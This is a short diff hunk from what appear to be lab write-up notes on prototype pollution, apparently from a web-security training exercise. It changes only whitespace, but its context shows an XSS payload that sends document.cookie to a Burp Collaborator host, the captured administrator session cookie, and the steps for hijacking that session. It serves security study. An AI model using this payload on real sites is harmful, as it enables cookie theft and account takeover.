@@ -5537,7 +5537,7 @@ Prototype pollution is a JavaScript vulnerability that enables an attacker to ad
     replace
     '"><svg/onload=fetch(`//cq63580niz3aoyy3a2m8whfqthz8n0bp.oastify.com/${encodeURIComponent(document.cookie)}`)>:gVMBuVlrUZqFK00Ujt6sqGmIgexfzljb
     ```
-  - wait a while, Burp collaborator show the response > copy the request url > decode as url
+  - wait a while, Burp collaborator show the response > copy the request url > decode as url  
     `GET /session=administrator%3an7ro2rZVmnA8EBc4pn32Rji9TipHhQHd; secret=6PtCxwEiBewuuH7Wa4IFD58V6iaPyKaP; session=administrator%3an7ro2rZVmnA8EBc4pn32Rji9TipHhQHd`
   - change the cookie value in DevTool > refresh the page > admin panel appear
   
